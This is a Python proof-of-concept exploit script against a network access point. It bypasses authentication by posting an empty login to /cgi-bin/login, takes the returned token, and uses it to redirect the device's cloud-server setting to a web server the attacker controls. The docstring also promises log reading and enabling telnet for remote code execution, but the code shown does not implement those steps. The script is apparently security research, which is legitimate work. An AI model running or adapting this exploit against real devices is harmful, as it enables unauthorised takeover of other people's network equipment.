"""
Broken auth: 
    - get token without providing any username and password
    - use it to read logs
    - use it to enable telnet (if not yet enabled) to show it can lead to RCE    
"""

import configparser
import json
import sys

import requests

config = configparser.ConfigParser()
config.read("configuration.ini")

URL = "http://192.168.188.253"  # AP

WEB_SERVER_IP = config["WEB_SERVER"].get("IP", "192.168.188.180")
WEB_SERVER_PORT = config["WEB_SERVER"].getint("PORT", 8080)


def do_broken_auth() -> dict[str, str] | None:
    """Do broken authentication
    When we don't provide username and password we get an auth token.

    Returns:
        dict[str, str]|None: Authentication JSON
    """
    rq = requests.post(
        URL + "/cgi-bin/login", data={"funname": 1, "action": 1}, timeout=1
    )
    if rq.ok:
        return json.loads(rq.text)
    return None


def update_cloud_server(token: str, webserver: str) -> bool:
    """Update the cloud server

    Args:
        token (str): auth token
        webserver (str): Web server URL

    Returns:
        bool: whether we succeed updating the server or not
    """
    rq = requests.post(
        URL + "/cgi-bin/cloud",
        cookies={"stork": token},
        data={"funname": 1, "action": 2, "enable": 1, "server": webserver},
        timeout=1,
    )
    if not rq.ok:
        print("[!] Could not update server")
        return False

    if json.loads(rq.text)["result"] != "0":
        print("[-] Cloud server update failed")
        return False
    return True


def main():

    # do exploitation
    auth_info = do_broken_auth()
    if not auth_info:
        print("[-] Could not auth")
        sys.exit(-1)
    print("[+] Login:", auth_info)

    token = auth_info["token"]
    print(f"[+] Token: {token}")

    # authenticated action
    if not update_cloud_server(token, f"{WEB_SERVER_IP}:{WEB_SERVER_PORT}"):
        print("[-] Could not send update cloud server")
        sys.exit(-1)
    print("[+] Cloud server updated")


if __name__ == "__main__":
    main()
